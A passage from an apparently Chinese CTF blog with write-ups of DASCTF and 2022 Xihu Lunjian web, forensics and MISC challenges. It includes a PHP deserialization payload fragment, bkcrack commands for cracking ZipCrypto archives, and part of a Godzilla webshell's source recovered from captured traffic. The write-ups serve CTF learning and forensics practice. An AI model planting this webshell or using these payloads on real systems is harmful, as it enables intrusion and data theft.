class="hljs-keyword">catch</span> (SoapFault <span class="hljs-variable">$e</span>) &#123;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">siroha</span>();<br><span class="hljs-variable">$b</span>-&gt;koi=[<span class="hljs-string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;nnnnn&quot;</span>]];<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br></code></pre></td></tr></table></figure><p>传参，这里注意get也要传，否则不传post的数据</p><figure><img src="/img/2023DASCTF-11/170264599166817.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再次访问index.php，成功覆盖</p><figure><img src="/img/2023DASCTF-11/170264599166818.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>cat /flag</code>即可</p><p>参考</p><p>https://fdlucifer.github.io/2023/07/01/2023-chunqiubei-spring-php-again/https://xilitter.github.io/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/https://www.vuln.cn/6763</p><h2 id="realrce">realrce</h2><p>原型链还不太熟，总结完再回来看吧，挖个坑</p><h1 id="misc">MISC</h1><h2 id="icetea">IceTea</h2><p>流量包，抓第一个shell.php，有一串hex</p><figure><img src="/img/2023DASCTF-11/170264599166819.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>转一下看到ELF头</p><figure><img src="/img/2023DASCTF-11/170264599166820.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ida打开看到有base64换表的表（正常是<code>A-Za-z0-9+/=</code>）</p><figure><img src="/img/2023DASCTF-11/170264599166821.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看每一个流的操作，base64解密一下，<code>./ezbase e flag.txt IceTea.txt</code>可以看出用了ezbase这个程序（也就是刚刚拿到的elf加密了flag.txt），然后再<code>cat flag.txt</code>，那就看这个cat的流</p><figure><img src="/img/2023DASCTF-11/170264599166822.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看第四个流的response信息，就是加密后的flag.txt信息，base64解一下</p><figure><img src="/img/2023DASCTF-11/170264599166823.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>解出来的这一串再base64换表，得到flag，<code>DASCTF&#123;Ice_tea_is_not_a_loser_drink!&#125;</code></p><figure><img src="/img/2023DASCTF-11/170264599166824.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>题目不难，出的也还可以</p><h2 id="拼拼凑凑">拼拼凑凑</h2><p>ppcc目录下有1296张小图片，像素为40<em>40，首先想到用montage+gaps拼图为36</em>36的大图</p><p>一套下来得到这两张图，显然不太成功</p><figure><img src="/img/2023DASCTF-11/170264599166825.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这张图已经能大概看出图的样子了，但是没什么用</p><figure><img src="/img/2023DASCTF-11/170264599166826.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看png，尾部还有很多数据，但是确实看不出是什么</p><figure><img src="/img/2023DASCTF-11/170264599166827.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看了wp，真脑洞，最后两个数是坐标，写脚本提取一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment">#文件名到位置的映射</span><br>file_name_to_position  = &#123;&#125;<br><span class="hljs-comment">#png文件列表</span><br>png_files = os.listdir(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>)<br><span class="hljs-comment">#png_files.remove(&#x27;de.py&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> png_files:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+i,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        location_data = f.read()[-<span class="hljs-number">2</span>:]<br>        location_x,location_y = location_data[<span class="hljs-number">0</span>],location_data[<span class="hljs-number">1</span>]  <span class="hljs-comment">#自动转成10进制数</span><br><br>        file_name_to_position[i] = (location_x, location_y)<br><br><span class="hljs-comment">#根据映射排列png</span><br>sorted_png_files = <span class="hljs-built_in">sorted</span>(png_files, key=<span class="hljs-keyword">lambda</span> filename: file_name_to_position[filename])<br><br><span class="hljs-comment">#每个小png的长宽</span><br>png_width,png_height = <span class="hljs-number">40</span>, <span class="hljs-number">40</span><br><br><span class="hljs-comment">#创建背景图像</span><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (png_width*<span class="hljs-number">48</span>, png_width*<span class="hljs-number">27</span>), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br><br><span class="hljs-keyword">for</span> i, filename <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sorted_png_files):<br>    <span class="hljs-comment"># 读取小图像</span><br>    tile = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+filename)<br>    <span class="hljs-comment"># 计算小图像在目标图像中的位置</span><br>    x = (i % <span class="hljs-number">48</span>) * png_width<br>    y = (i // <span class="hljs-number">48</span>) * png_height<br>    <span class="hljs-comment"># 将小图像粘贴到目标图像中</span><br>    img.paste(tile, (x, y))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Pasting <span class="hljs-subst">&#123;filename&#125;</span> at position (<span class="hljs-subst">&#123;x&#125;</span>, <span class="hljs-subst">&#123;y&#125;</span>)&quot;</span>)<br>    <br><span class="hljs-comment">#保存为re.png </span><br>img.save(<span class="hljs-string">&#x27;res.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>拿到原图</p><figure><img src="/img/2023DASCTF-11/170264599166828.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>这里又是一个比较难找的地方，在图片的左下角有一个像素条，用ps看</p><figure><img src="/img/2023DASCTF-11/170264599166929.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023DASCTF-11/170264599166930.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>发现rgb为5的倍数，将300-362的像素除50后5进制转字符串(?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment"># 打开包含像素数据的图像</span><br>image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;res.png&quot;</span>)<br>key=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 初始化一个空列表来存储像素颜色值</span><br>pixel_colors = []<br><br><span class="hljs-comment"># 读取x坐标为300-362，y坐标为800的像素条像素值</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">300</span>,<span class="hljs-number">363</span>):<br>    pixel_color = image.getpixel((x, <span class="hljs-number">800</span>))[<span class="hljs-number">0</span>]//<span class="hljs-number">50</span><br>    pixel_colors.append(pixel_color)<br><br>group = []<br><span class="hljs-comment">#五进制转字符</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pixel_colors:<br>    group.append(<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-built_in">print</span>(group)<br>    <span class="hljs-comment"># 每三个数字代表一个字符</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(group) == <span class="hljs-number">3</span>:<br>        current_num = <span class="hljs-number">0</span><br>        power = <span class="hljs-number">2</span>  <span class="hljs-comment"># 修改初始幂值为2</span><br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> group:<br>            current_num += <span class="hljs-built_in">int</span>(d) * (<span class="hljs-number">5</span> ** power)<br>            power -= <span class="hljs-number">1</span><br>        key += <span class="hljs-built_in">chr</span>(current_num)<br>        group = []<br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-comment">#Th1s_1s_k4y_0f_s3cr3t</span><br></code></pre></td></tr></table></figure><p>拿到key，<code>Th1s_1s_k4y_0f_s3cr3t</code></p><p>拿到key有什么用呢，想到刚刚png里多出来的尾部字节</p><p>提取出来拼在一起（脚本照抄了，最后一张图字节数还不一样，这题出的...）</p><p>修改后最终的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><span class="hljs-comment">#文件名到位置的映射</span><br>file_name_to_position  = &#123;&#125;<br><span class="hljs-comment">#png文件列表</span><br>png_files = os.listdir(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>)<br><span class="hljs-comment">#png_files.remove(&#x27;de.py&#x27;)</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> png_files:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+i,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        location_data = f.read()[-<span class="hljs-number">2</span>:]<br>        location_x,location_y = location_data[<span class="hljs-number">0</span>],location_data[<span class="hljs-number">1</span>]  <span class="hljs-comment">#自动转成10进制数</span><br><br>        file_name_to_position[i] = (location_x, location_y)<br><br><span class="hljs-comment">#根据映射排列png</span><br>sorted_png_files = <span class="hljs-built_in">sorted</span>(png_files, key=<span class="hljs-keyword">lambda</span> filename: file_name_to_position[filename])<br><br><span class="hljs-comment">#每个小png的长宽</span><br>png_width,png_height = <span class="hljs-number">40</span>, <span class="hljs-number">40</span><br><br><span class="hljs-comment">#创建背景图像</span><br>img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (png_width*<span class="hljs-number">48</span>, png_width*<span class="hljs-number">27</span>), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br><br>appended_data = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i, filename <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(sorted_png_files):<br>    <span class="hljs-comment"># 读取小图像</span><br>    tile = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+filename)<br>    <span class="hljs-comment"># 计算小图像在目标图像中的位置</span><br>    x = (i % <span class="hljs-number">48</span>) * png_width<br>    y = (i // <span class="hljs-number">48</span>) * png_height<br>    <span class="hljs-comment"># 将小图像粘贴到目标图像中</span><br>    img.paste(tile, (x, y))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Pasting <span class="hljs-subst">&#123;filename&#125;</span> at position (<span class="hljs-subst">&#123;x&#125;</span>, <span class="hljs-subst">&#123;y&#125;</span>)&quot;</span>)<br>    <br>    <br>    <span class="hljs-comment"># 读取图像文件的二进制数据</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ppcc/&#x27;</span>+filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        image_data = file.read()<br>    <span class="hljs-comment"># 根据位置信息选择要拼接的字节范围</span><br>    <span class="hljs-keyword">if</span> file_name_to_position[filename] == (<span class="hljs-number">47</span>, <span class="hljs-number">26</span>):<br>        appended_data += image_data[-<span class="hljs-number">923</span>:-<span class="hljs-number">921</span>]  <span class="hljs-comment"># 对最后一个文件拼接不同大小的字节范围</span><br>    <span class="hljs-keyword">else</span>:<br>        appended_data += image_data[-<span class="hljs-number">811</span>:-<span class="hljs-number">2</span>]  <span class="hljs-comment"># 对其他文件拼接固定大小的字节范围</span><br>        <br>        <br><span class="hljs-comment"># 将拼接好的数据保存为res文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;res&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> res_file:<br>    res_file.write(appended_data)<br>    <br><span class="hljs-comment">#保存为re.png </span><br>img.save(<span class="hljs-string">&#x27;res.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到res，有Th1s_1s_k4y_0f_s3cr3t猜想是veracrypt，直接password还不行，要加上png为keyfile</p><figure><img src="/img/2023DASCTF-11/170264599166931.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到flag.txt</p><figure><img src="/img/2023DASCTF-11/170264599166932.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>(真脑洞，怪不得0解)</p><h2 id="ez_forensics">ez_forensics</h2><blockquote><p>近日，警方破获了一起串通招投标案，控制了相关嫌疑人，并对所有计算机进行了现场取证，获取到了磁盘和内存镜像（附件1，MD5值de7f245743f96721a68ca8ad3355d081）。在后期的勘验工作中，警方在公司财务的计算机磁盘镜像中提取了一个可疑文件（附件2，MD5值e4a9669e7545647aa8921ac06421aaec）。根据抓获的其他嫌疑人供述，该财务掌握有一份其通过购买黑客服务获取到的专家名单，并且拥有非常强的加密，但公司财务拒不交代其加密方式及密码，并对以上供述表示否定，称不知道有加密的存在，更不知道专家名单的事。现要求你对该提取出来的可疑文件及内存镜像进行勘验，尝试解析其内容，并提取其中的专家名单，计算其小写MD5值作为flag提交（格式要求：DASCTF{小写MD5值}）。</p></blockquote><p>附件1是内存镜像，用vol分析一下</p><p>imageinfo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>INFO    : volatility.debug    : Determining profile based on KDBG search...<br>          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418<br></code></pre></td></tr></table></figure><p>pslist</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-number">0xfffffa80023ee060</span> TrueCrypt.exe          <span class="hljs-number">2820</span>   <span class="hljs-number">2464</span>      <span class="hljs-number">4</span>      <span class="hljs-number">212</span>      <span class="hljs-number">1</span>      <span class="hljs-number">1</span> <span class="hljs-number">2023</span>-09-<span class="hljs-number">19</span> <span class="hljs-number">14</span>:09:<span class="hljs-number">32</span> UTC+<span class="hljs-number">0000</span><br></code></pre></td></tr></table></figure><p>看到有TrueCrypt，猜测附件2为TrueCrypt加密的卷</p><p>filescan</p><figure><img src="/img/2023DASCTF-11/170264599166933.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>truecryptpassphrase</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Python">Volatility Foundation Volatility Framework <span class="hljs-number">2.6</span><br>Found at <span class="hljs-number">0xfffff88004298ee4</span> length <span class="hljs-number">16</span>: CZYWS_s4zyd_User<br></code></pre></td></tr></table></figure><p>拿到密码，VeraCrypt挂载，因为是用TrueCrypt加密的，选<code>TrueCrypt Mode</code>，</p><figure><img src="/img/2023DASCTF-11/170264599166934.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到文件名为ECB的乱码文件</p><p>用刚刚的key：<code>CZYWS_s4zyd_User</code>解密ECB得到提示</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Do you know how <span class="hljs-built_in">to</span> <span class="hljs-built_in">decrypt</span> <span class="hljs-keyword">a</span> hidden volume <span class="hljs-keyword">by</span> this decrypted <span class="hljs-built_in">file</span>?<br></code></pre></td></tr></table></figure><figure><img src="/img/2023DASCTF-11/170264599166935.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据提示将<code>Do you know how to decrypt a hidden volume by this decrypted file?</code>写入文件并保存</p><p>然后VeraCrypt使用keyfile挂载即可得到隐藏卷</p><figure><img src="/img/2023DASCTF-11/170264599166936.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据题目计算md5值</p><figure><img src="/img/2023DASCTF-11/170264599166937.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>最终flag，DASCTF{c2c68e18fa4f01a4877a586104e7c721}</p><p>(这题出的不错)</p><h1 id="总结">总结</h1><p>题目出的质量还是很高的，能学到新东西，感谢Opsu3的师傅们</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022西湖论剑MISC复现</title>
    <link href="/2023/11/30/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/11/30/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91MISC%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑misc复现">2022西湖论剑MISC复现</h1><p>强网杯快开始了，想着复现一下取证和misc的题目，刚好2022西湖论剑都有，而且难度也挺高</p><h1 id="misc">MISC</h1><h2 id="mp3"><strong>mp3</strong></h2><p>拿到cipher.mp3，听一下，熟悉的可以一下分辨出这是<code>mp3stego</code>的默认加解密音频，因为没有密码，先看看010</p><figure><img src="/img/2022西湖论剑MISC复现/170134897029315.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看到有个png，foremost分离一下</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702651.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到只有黑白像素的png图片</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702662.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>按行转成010的二进制值然后再转成16进制数保存为文件看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Bash">from PIL import Image<br>import struct<br><br>img = Image.open(<span class="hljs-string">&#x27;00000646.png&#x27;</span>)<br>width, height = img.size<br><br>f = open(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment">#按行读取</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(height):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(width):<br>        flag += str(img.getpixel((x, y))//255)  <span class="hljs-comment">#255//255 = 1 ; 0//255 = 0</span><br><span class="hljs-comment">#print(flag)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(flag), 8):<br>    f.write(struct.pack(<span class="hljs-string">&#x27;B&#x27;</span>, int(flag[i:i+8], 2)))<br>f.close()<br></code></pre></td></tr></table></figure><p><code>50 4B 03 04</code>拿到zip，里面有个加密的47.txt</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702663.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>尝试了一下不是伪加密，回到mp3stego，无密码直接解密得到压缩包密码<code>8750d5109208213f</code></p><figure><img src="/img/2022西湖论剑MISC复现/17013489702664.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>拿到47.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">2lO,.j2lL000iZZ2[2222iWP,.ZQQX,2.[002iZZ2[2020iWP,.ZQQX,2.[020iZZ2[2022iWLNZQQX,2.[2202iW2,2.ZQQX,2.[022iZZ2[2220iWPQQZQQX,2.[200iZZ2[202iZZ2[2200iWLNZQQX,2.[220iZZ2[222iZZ2[2000iZZ2[2002iZZ2Nj2]20lW2]20l2ZQQX,2]202.ZW2]02l2]20,2]002.XZW2]22lW2]2ZQQX,2]002.XZWWP2XZQQX,2]022.ZW2]00l2]20,2]220.XZW2]2lWPQQZQQX,2]002.XZW2]0lWPQQZQQX,2]020.XZ2]20,2]202.Z2]00Z2]02Z2]2j2]22l2]2ZWPQQZQQX,2]022.Z2]00Z2]0Z2]2Z2]22j2]2lW2]000X,2]20.,2]20.j2]2W2]2W2]22ZQ-QQZ2]2020ZWP,.ZQQX,2]020.Z2]2220ZQ--QZ2]002Z2]220Z2]020Z2]00ZQW---Q--QZ2]002Z2]000Z2]200ZQ--QZ2]002Z2]000Z2]002ZQ--QZ2]002Z2]020Z2]022ZQ--QZ2]002Z2]000Z2]022ZQ--QZ2]002Z2]020Z2]200ZQ--QZ2]002Z2]000Z2]220ZQLQZ2]2222Z2]2000Z2]000Z2]2002Z2]222Z2]020Z2]202Z2]222Z2]2202Z2]220Z2]2002Z2]2002Z2]2202Z2]222Z2]2222Z2]2202Z2]2022Z2]2020Z2]222Z2]2220Z2]2002Z2]222Z2]2020Z2]002Z2]202Z2]2200Z2]200Z2]2222Z2]2002Z2]200Z2]2022Z2]200ZQN---Q--QZ2]200Z2]000ZQXjQZQ-QQXWXXWXj<br></code></pre></td></tr></table></figure><p>由47联想到rot47</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702665.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>类似jjencode，console直接解得到flag：DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</p><figure><img src="/img/2022西湖论剑MISC复现/17013489702666.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="take_the_zip_easy">take_the_zip_easy</h2><p>拿到zipeasy.zip，里面是两个加密的文件，看到两个文件名字一样，猜想zip是pcapng压缩得到的，而且加密算法为ZipCrypto，有两段偏移可能相同，30-43：<code>64 61 73 66 6C 6F 77 2E 70 63 61 70 6E 67</code>，0-3：<code>50 4B 03 04</code></p><p>尝试明文攻击</p><figure><img src="/img/2022西湖论剑MISC复现/170134897026613.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><code>bkcrack.exe -C zipeasy.zip -x 30 646173666C6F772E706361706E67 -x 0 504B0304 -c dasflow.zip</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bkcrack</span> <span class="hljs-number">1</span>.<span class="hljs-number">5</span>.<span class="hljs-number">0</span> - <span class="hljs-number">2022</span>-<span class="hljs-number">07</span>-<span class="hljs-number">07</span><span class="hljs-meta"></span><br><span class="hljs-meta">[19:36:43] Z reduction using 6 bytes of known plaintext</span><br><span class="hljs-meta">100.0 % (6 / 6)</span><br><span class="hljs-meta">[19:36:43] Attack on 1038290 Z values at index 37</span><br><span class="hljs-meta">Keys: 2b7d78f3 0ebcabad a069728c</span><br><span class="hljs-meta">67.7 % (703384 / 1038290)</span><br><span class="hljs-meta">[19:41:03] Keys</span><br><span class="hljs-meta">2b7d78f3 0ebcabad a069728c</span><br></code></pre></td></tr></table></figure><p><code>bkcrack.exe -C zipeasy.zip -c dasflow.zip -k 2b7d78f3 0ebcabad a069728c -d dasflow.zip</code></p><p>得到dasflow.zip，解压得到dasflow.pcapng</p><p>简单看看，比较明显是哥斯拉流量，里面还有个flag.zip，<code>stream 6</code>里有原始的webshell，可以看到key为<code>d8ea7326e6ec5916</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;air123&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;d8ea7326e6ec5916&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span 